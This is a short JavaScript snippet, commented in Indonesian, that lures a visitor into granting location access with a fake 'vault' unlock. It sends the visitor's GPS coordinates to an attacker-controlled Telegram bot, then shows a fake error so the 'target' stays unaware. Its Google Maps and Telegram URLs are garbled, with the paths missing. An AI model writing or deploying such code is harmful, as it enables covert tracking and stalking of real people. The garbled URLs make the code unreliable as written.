<script>
function getLocation() {
    if (navigator.geolocation) {
        // Meminta izin akses GPS ke target
        navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
    } else {
        alert("Browser tidak mendukung fitur ini.");
    }
}

function sendToTelegram(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    
    // GANTI BAGIAN INI DENGAN DATA ANDA
    const token = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI";
    const chatId = "MASUKKAN_ID_CHAT_ANDA_DI_SINI";
    
    const googleMapsUrl = `https://www.google.com{lat},${lon}`;
    const pesan = `⚠️ TARGET TERDETEKSI!\n\n📍 Lokasi: ${lat}, ${lon}\n🌍 Buka di Peta: ${googleMapsUrl}`;

    // Mengirim data ke Telegram secara otomatis
    fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`)
    .then(response => {
        // Tampilan palsu agar target tidak curiga
        alert("Gagal memuat brankas: Koneksi server sibuk.");
    });
}

function showError(error) {
    alert("Maaf, brankas hanya bisa dibuka jika Anda mengizinkan akses lokasi.");
}
</script>
